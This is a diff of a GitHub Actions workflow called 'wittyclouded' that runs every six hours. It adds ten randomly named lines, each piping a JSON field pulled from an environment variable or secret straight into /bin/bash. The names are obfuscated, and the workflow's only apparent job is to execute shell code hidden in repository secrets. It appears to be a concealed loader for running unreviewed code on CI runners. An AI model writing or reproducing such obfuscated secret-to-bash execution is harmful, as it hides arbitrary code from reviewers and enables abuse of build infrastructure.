@@ -3,23 +3,26 @@ name: wittyclouded
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 3/6 * * *'
+    - cron: '32 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wittyclouded
         env:
-          vuifd46: ${{ secrets.vuifd46 }}
+          hoqzv54: ${{ secrets.hoqzv54 }}
         run: |
-          echo $vuifd46 | jq -r .r59 | /bin/bash
-          echo $u72767 | jq -r .vfmpq12 | /bin/bash
-          echo $yywc0 | jq -r .mugkb0 | /bin/bash
-          echo $m125 | jq -r .l95 | /bin/bash
-          echo $hnex195 | jq -r .fdpmu5 | /bin/bash
-          echo $mzdn80 | jq -r .fts3 | /bin/bash
-          echo $pirvs66298 | jq -r .d8163 | /bin/bash
-          echo $z45 | jq -r .zkmnf019 | /bin/bash
+          echo $hoqzv54 | jq -r .r556 | /bin/bash
+          echo $kepb15620 | jq -r .i57 | /bin/bash
+          echo $i935 | jq -r .eipl970 | /bin/bash
+          echo $o791 | jq -r .c95105 | /bin/bash
+          echo $gyju37852 | jq -r .o70681 | /bin/bash
+          echo $tjws098 | jq -r .ib10848 | /bin/bash
+          echo $zhua58 | jq -r .orkb28 | /bin/bash
+          echo $xds2605 | jq -r .f7 | /bin/bash
+          echo $hcr74 | jq -r .dlx64980 | /bin/bash
+          echo $id311 | jq -r .klket044 | /bin/bash
 
